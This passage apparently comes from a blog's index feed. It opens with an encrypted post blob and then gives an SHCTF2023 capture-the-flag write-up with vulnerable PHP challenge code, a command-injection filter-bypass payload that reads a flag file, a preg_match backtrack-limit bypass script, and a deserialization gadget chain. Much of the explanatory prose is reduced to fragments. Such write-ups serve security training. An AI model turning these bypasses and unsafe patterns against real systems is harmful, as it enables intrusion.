9c4937f8828d6c09f7e3047b68cc68f11b21e69811d7857e1c835b069d5a391e3ac3c95fd15160d011d83e501b390f39345bb7c01d495fcc1bd113c7701385f49d4d487e5eaa11ef089244ffad3efedc45fb23b5227ef6598f2aaf0260b09c344087f07002963fe966fcd366d5d955c6bc4fd24a78c44128e3e89b703d510ce101371b61478370f241caaae7987c0970f0ecd33329b24cd20241b979d6c96c6b7cd9705c926b5686e10c30015292a0c845015fd8efa5f8b2afd0fc666979887dcae7b291d41cdf13f8bc2fef66c3e375c48a42b452ef0f6af60484d5334fd6cc5f4c19f401b432af6c7e195d02bcf7a6502a9fd0f631a872cbd4d68799f27a8c3534e1c2d73bcef97bc002bfa3262364c0a5f619526125a3132cd9cfd2f59dcb29f4b37ec2e1f95de92cd1268e5e92ddd5c243a750d0f734c247a723728c61dac3867ceccaf92fa9ccff9cbb6444b344cab29fb257030c5054124b84d71407db5fca0e2443beed7405e85cacece8474162cdb61714cc80fec3c966e15fddb1285a0aca0450bd1188a0e8fd382b7af9d2077d2de8244c8767949c34cdba16e1dcd7b3ae71c66b3135ad2eb7e29de7b825440ad3e3c72d5a3afe657210f331e2ede268e4f6586d6be60298b26d2302f21e6803f3bc9c09abec38ea83cb630010a52fd3abe1cfa7c228218b72e3a0f38f37b56bbaed324b5276d46d85f4f534f40dac6622c053966bcaf05156bceed878b32483fc56139616c7c666185e1394af940ddd895772c95a0a14c68943641d524b25653eb54b704d35df97b3d7548474557de7e633b54d83732e09093860bd635cdcf8d13d6c45faa426a13ccffea19156045f1fe3e8e3010c31904c759789ece6fbe4f25fd2f0a222e34bd4c2aed170f1c1f4c6e0cca6b7a9c26efc2539644406d3fb23aac2e362f638a198bf6aece4442ed40573cd024650fba31754b56ea8d441841cb5950ad3dae0745945fc338c5b9feaf300e7cb4491ae48b02eaa6464a5cce2bb8339ba1a2a5d83e6494c43d457e639990d6fdf7113ca3733e6088c748fec9583487968bda21402d36e82e8dcbc7e7c8d7dd709be8ec75c2bc4b02a8a6ea58a9f424220899772bbe5ab967699e4bdc39d870dff4d1124f5e6332f87f8434d719d7eda097a7458797dbf6bba36ba47c952ce2d599a818e3233e29f00750a639bc32840d9b41b7738a75910f3191924524e5b8400a64b0eb5c0f2326058b0b286e23165e342cbc690831c91fdab3e7c452025121310798563c67c9aebfbe8dcd8de847b7d81f93a8206eedbb1cc12ff9fd85524224b59119db9772f0400a8b5ab36dec396fda1115eb66e4bb50f8f95dcebfce6d62c448a06b054b0429b93b4c2f6a6243306c7ab4d593facf19561bae536fcce1622aea8d8489f5458b592632bb97eb5d59f9e09fab8f53e5156c44c910d8d6a971abcfe658d1f6a11657e04461fb9796d9508ced73e91babe81fcdea4c7169ba08972915dcb1a5826fcfa98d3e02071ccc9a9c83d793e7892eec377887eb37b07a2ab4c3f8024431a6256b7208acb88d52e0567d83b7eb66d57c3e2b0d15e4ec71d9798bdeaaf65ce2c21885170188fa7d861a6d599ef30b8baf503e0ede3bd8c2a877c9e7a4ac67285cf9ecc87df03d5980bc2ff7112c6704adc3769c65ca7ee486d7d5a9e1560d37cfa036e29a0e2673577e21699ab0133ad9f5e7f2297814172d5f1f317277cf10cc8781dd6749be8b3bddce05748c2c2f0b974f0edb80d06a62f50cc77204adbf30b7f091e9e99b787ad3878dd20440bc9beed47b40a6f81e1b9246cd17632bc4be7e99d165e0e573ea86a227758954925d60fda4f9f7912d918593aca890152e1805020ef76c0f046d5f2c8eae26eb3c1049cf978d59247e3fc1f59a4bf63e7d932262319fe1d4e55e2a68e59ee20e895d076a5ba25dd250595daf0153c351fd3562c4575876265aa22455a8efdb4e70505911ff0d28722ded922be028c9065719e0593ac5a050883bf80cd4bdc2e6d62c6644f178a0a5709c0753054b91792aaaee8279b6deb845bc7b432e0000e3746d72c2a8497332f6221753810cdf79d3d47970d59a4cd85d7f464390d9fb66b6d69e4f1f9cb0ff90e07b8f0772bafb610565cb03394975447df99c061f1780abd472b0b8b75fc98c1e323dee8fd6fb0b6d057b685758d6656f05fe084720281d919193ce1fe49fbe4036b1a09315ac2a5adba4af7ca0b6457191a4c589c69ab0723e622e4523a37e807c70a7df1cab87f050279f669a2c85323079a3b0866dfd2a529090e27c23078da71b8f6e2971b640e44b2d416647a70197b15bb411177ab82d50d156585bd1220df80768edca70b177b7b7ab8a23473fd140be9a528d8e8e51f18a58588f829bd077732910f80d95401fde50ba450700c5e3eebb949738a7899db1b5faacdde8171893a3cda6b544cf69956779ca534b38a291f16572b742bac56c4648447163a2de955188740083a1ba4be047f2fc195965cb073d1afa8d2a60ceb16b4ecd440f4e69facf51687fd706e2374e1d32f2e6a567bbeeb781c7e168f2c9a1c5b5f1cdf57438c548fcd5b56acd4b27ce1983f010acbe47d39484410f665a96ff01ede2f0f45af890791a1a88bfb4a6b4559dd16c1597387c59c8f905b2287a99137a4a0b13021c4185c56ad0567f3229016071601ef2b3c2371acf90f94e25cd6993518e2f1aed1c3f94d7df724c8f6e6cd769500fca2c689a87fc45b55caa43c00fabdd76ccdee2cc007ae83c8f5383de689f2fcf992d02445e1d5b092061d7fd2af6ebaa951282747e046405f961064bf3a3600ce600d279539b35773bf0f085262794baf50fb113655b2df6aa8c21b017115c520e664fd842c2ccb0ba3218597580f1da6007dd4a8493a2239be102b509ba072a6bc657943a74e557183eae2082fd1820288c9cea78964fd35be395ffea1c4c97b656725fdc6dbfaaaf87f12e0dcd0dd50f4ed7cd856fc6aea30eb713f43d065e0bc78f2fdf49ae07632c4f27fb21c73bf557796324040f660858a6ca84303f4b8956953ad704279aad25a956988999b7791394f7fdef6e2168168afcf3faef03c158e45b210ad6163c19c05e14f1b2fc2ac957628a5b4223d99fe9d3c63fddeeb10c47653a4e49c4719c278e58675d849f3a08d48a6e9662cc03cba9dc87424100db82025fedea429bea8b33ce6e0e2ce48e92c4de7270ae09a1330e076d437d42e0e06dce7fec22c302b6da3d83403dbb7f38bb405644dd39b80101e337515298970be806174c9bc2a14e23dc511b4f6bf96b5ffa16bbb9ea47c02a19c6ddcd9f0db72df4783242eaf70c9a1ce0bb279e7afa4d8eec5ef21e100468ed71bca00aea9ef78fcdd0905b37be9481e400e3396e6b7170b11c2f1875a76088e18e5d34835df8a813c46e3225fea60d5b55720478d5d41907d31263234de60a934eb5e388d01804e8ebbbe08c00b345847134378dcb974479bc3973937df587d5c9a52beec6e0889b2331d33b411bc181be2dac3908a0d5db6170192f75a4c4eec68f0c517e29674e72a0a7b18a60e27a70c292385a48e3a51a4f02bfb842820636408a1532522ee5e65494326f3d84be1ad4cd6f3d57da1ab773ea4bcaa1790cceded2bf1dc752b9996d3f5d9ee8d2344917eca96dedc759318bfdbe612d07242ceabc317c32d121d8a857d93131c8cd5d0e1f12069f8b62a2d4960f2857c612e69b2622e2567dfa3e0e3f5e70770168a600f0c2db148cf89396c2331998d1ce9a8b964145d30b2e703b72ac5b3c56d50b1b0fcf8e9a19304cd273def27502e73361e8954ca544521bd0cb4cdea6f1229a33fb26b59f800872c3c371cf7aa80ca090f8267b42fec417bde4abda40e0a883c14c7fd76771f4f3dade839987b23ac8d59fa7cfec67c16ead8cccaf6df9a5550b1f27188c5af8b5d9e146ae7cf980e9b26de04968b34d2a1b0513bda12bed08ab0a7944caea91dada6a344eae3d0cfdafab0b9cd6f1f51d1a170043240c78ce7ac5d9614c73e4727865e408abf81450eed6ecca2d2b596fbd8a7f30fc31e7af8553f1895d5a286ebd07b3bf76ee8c86c56fb7a23fcf50e23491847ab4b4760bd5f8bd4f09dff93b329c3ed599c920767f7bc6b7b07aa3d09d36a5dca9d51e8040a77e9b5cc26892e6880d2f092b618c71c67c08f34654011b44c208a8004083698e4bb401eaf3b0159979a663506eb0f31818494febce3b91460120953b01b1e61fe36c49a5a5754de8656f675778752908fbc12c05b17912c8b9ddd811ea108fb8932a962c7229fd6aec6122104cb92d78a4300802a25d898d72eb08de030bd58ff0cc7a4d13ad9f4e30ba66a548cdc60e1ad1be09fb9d3a0df3d1544a186d0e8262f7d5f732a01e844a03e96b47bda32be33e6daf63ba2836956f43b2cc898e19362e80ab457221c0d07e55b8725b2de475f5af5d6b55f37c440acb65dea5c42824bf006a543755247b3abdc627180ec9d3f7686060b3997ed58c75c35e0b80d862e774d9e07c5cf494bf645184febc49a63f013f770e6a134dcac61343cb88aeb59f7492032ab027b1373c705273322b80acf67536c364502e284ae9bc9ea103cb1efa698b48488f01feea3611d2b69690801dc25a7dfeaec14d8bd923537ab59e418a705e9cbed00c3e44099b2e43b2868cc704a4b0ef413f306182a2728565fac029298dc6764b76e596563cef73ba6807e785d4b080600f29f48b2385eb93eba68882ed15252f464340c204a786ab14ca470f94aa295a3c424b2369ed22413aee3fc7dd25849f815a42a829f4cbce233f3d97a5e8421718ef33ba078edc49ecc84aa77ceca4574e5bb10223c2b6c349ba051ee2880d50a0d59777fc0582467c556be45825b981eed7cc646ce0fec2c31d34e5880ad3159987597e6db59f8c281f007158e6ed4da681f75772a0fd2c9a7332d737a003e63d8de4beee795b97e31b6c89fdd825527a892703abcfa7d250898ea04f33d0f20d0beb2c7ab9fc5eba7002f1a3359cca2fff3a58e8081a78239cdf15213ac124316f6f01efa672cf13add92ed55fd9743b56470ec024e8be6fb43bce483241dad229b7320c492878c1ed517c8b820232db71e3c12277c3586dfff6a3649ed11a004073d3ea812c74510ce902f567e53bcc17e6d6c98cda287c083576f58023a3dd39d1bccf3a00b4849094860697fbbb8282c3c6a014c7aa7309fe26a00b1846cff935ec6f2261728357c3733bbd98cbc88bac2da0e5fa4279eaf81e83d62b42514357cb1d851ac717ab679a0f6e9affc7b4729255647dd8f8c56fdc5166a67408601285bd796126a53b5d57aa4476738e1a17d4c6068524281050c29adf7e0583d39de1fb5eae062c4efc3d21b176301e30d967ef5599a6de946c118955e7906ba218006328854ec91d5750952747e3a77e4ac02c207195625ea0bf8a530ceb20d65eba428d7325631b0aa7411efe9e7b23d857e9096c2abb72256a8eb7c53f9cf37ca41a8362f236a4c946b4f8bc9aff5ee54f98cd6a541fc0df66e5e04f30cbd6e71a429c183b06fd4782bdc95d757f598d0f9f606fccac27afa495cfc3ec9558f6b68654b74b43bc8e2a645512bc69af1b43887d16cd67162749bf110e1b148d0bed5a0e3b9bc42b00f3d71f378ad8488f06d9d25c95ffb8db2bc895925b8a30ac2388a620bf915c3b5773c5c32e930c1d7beac8a50b79fcfeaaecbfeb09ae111fd9cdc92d3cbe51b336e9dc3c54284f5f78e998866357a2f53bc196f7fff88dba3dddeba3a966d1880616d8e4376d15a7e1f06981872bf359b50306d992c6bf385e50e3a1cbb11a4995649071b6934194b6ffc5cad346e6fa5b6145b9f3a5d7cfdf17d89152e29fdecb231414d63c6ba7e64ceafaf597575e944d9bf6c77f9bfeedeadd0ee4a5b751655ba3176087904b41e72dcfbf3fbc6b5fcfd9dd68165e24bc5a068e95a9734e9b1f45c9c0366966159dffecee5d5e1d3f08ae5962de06b7b5a3079f621b6492ed03ec1efb350b3848c9c12283befb6e572865103bb836eb474f42f7d5f80aab5b13b2420fe84c3d7b9ce0bfeb256b4049049d04ac06be5e145ae177087591e95ed9edc6e59530939474445b89416d8e90a3b200f58eba1b96c2e95a8371de4997bac6ffa06944e1902809364c0f58b609737bb24ec0165a195b6fecd2aa3c5ceb57bead7595e4fb37c4cdea369c1b1fe7afe7a72702781983841ca6b4a0cd648af7e773eadd5e13be120adb33db12109c36923ed2392aab4c5ce1f8fddf92d3d75ba5adf99324c36c7fd0c16d3971590cbb14bb94939081db44edd917cc70c61945d467954903fe147855e26ec34b4eeadd3aa8b3781f00f469a2c77158815526ccbbef9a7cfb873b8d0d412fc177001de7cf6a49214e05daeade037d0fa97591f0f9d39428439d7c324c4120117b52425ea6275240803755003619f6134ce163b2d9290542d304ecafc5807a7cdcd1a312ecdecc9c8d2fb96ae8f25b72e58799e14a84241427dfa973f24e04dd8406e447977159500b6149d73fea481c4894e982bddc138fdbd46e117cf73693943a87d8ddf6cb18caa4e5e48740b518627b9384c9ff020d520e8120444da5950ef2998ea3a4543898703b3401445f7dd0a861507b057da482ff630851f79ef0335b8fe12c38f48657f66a21dc92e601f3af121fe1b14cd9eb1cdf2b2f0376562eacd4368dbf09ff7e8fc5644920a84de8370890f6aa4919561b9ea7831c4d0e4818ad49e5683f3f0f69eeedc1cf370bc9229ca05f949217ba8319c3f6eac2a5cbf727b441fedbd23e3880439cd01aa992424ee6909bd7d70dadc50895ce82708e891c09e52afab026e5adb802e43bafe3ea640d4575787875801abb46cb0e20c5ec6f5c451671df1e07ee3dec295417b518f627d6474e1416d6c08844f02b48bd0497ad7b45e09d19b44c4b8a3134c539403646712055ca313966ed4d0d8a518b00619925aaeae92ad5daa009f764094a0eeb7d2561c96a1b5330be28d81855f78f8b2b816087d301b365744bfce24518c293c3621b822ef59bf2f6da1826d5f1900f520c33d271a26eaf8cdc4fefc5606bfd8d4ea4a7e61621ec3939bfeacc6be9b546cef9e635045431fd5f8a83b21e829c3279526faf8acaa08c8596f9365604f2fa18f5d760c124d4da9010f31b5ca7f2aac14891cc99e1bba11bfab9bc2639c5e78daf02d3eff1eefd2f30ea58a4f16c8761317400445c601dae1b33309a5f99a64b9ea1918ba5652d2c0a95711ef67386fec4efee4e578fca8918ad280c254e6712a6d9a972145e64cefa97c7ace4fc1d23cc758d71962edaae962b5120420844fa913088d51ecc3d6ef25b2a56e3597ae4062fb9aaaebe7bdd34eea31b73ffdab9446e896b457f86be1a0a96feae2b63be3a699bf6d13eb302c8705017e0cf043478b68b15210045dc16c969fde3491fcebf691a2f8971556227937575fca879b658b114889ef6064f938195f17219a6310f69549fc38e67f5d7f8a24f0f3e89ec411f6bbf1c4623803d6561ec</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF2023</title>
      <link href="/2023/10/06/SHCTF2023/"/>
      <url>/2023/10/06/SHCTF2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h3><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$rce</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'rce'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\&lt;|\'|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hhhhhhacker!!!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cat<code>rce=c\at$&#123;IFS&#125;/fl??</code></p><h3 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h3><p>preg_match</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./index.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_ode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_ode'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?SHCTF/is'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no touch!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'2023SHCTF'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'what do you want'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?SHCTF/is'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no touch!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'2023SHCTF'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'what do you want'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SHCTF**.**&#x2F;is</p><blockquote><ul><li>i (PCRE_CASELESS)<br></li><li>s (PCRE_DOTALL)<br>  perl &#x2F;s  [^a] </li></ul></blockquote><p><img src="https://img-blog.csdnimg.cn/3557032fdb5c4508b9d2d555b8040c38.png" alt="1"></p><p> $code  SHCTFtrue</p><p><strong>preg_match</strong><a href="https://xz.aliyun.com/t/10219"></a><br>python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># URL</span>url <span class="token operator">=</span> <span class="token string">'http://112.6.51.212:31314/?num[]=m'</span>  <span class="token comment"># URL</span><span class="token comment"># POST</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'c_ode'</span><span class="token punctuation">:</span><span class="token string">'very'</span><span class="token operator">*</span><span class="token number">260000</span><span class="token operator">+</span><span class="token string">'2023SHCTF'</span><span class="token punctuation">&#125;</span><span class="token comment"># POST</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment"># </span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br><a href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_</a></p><h3 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h3><p>php<br>php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">q</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>                   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">z</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>A<strong>include()</strong>flag<br></p><p><code>** __invoke**</code></p><blockquote><p> __invoke() <br> <code>Person</code>  <code>__invoke()</code> </p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>  <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string single-quoted-string">'Male'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span>  <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sex</span>  <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">': '</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Yufei'</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token string 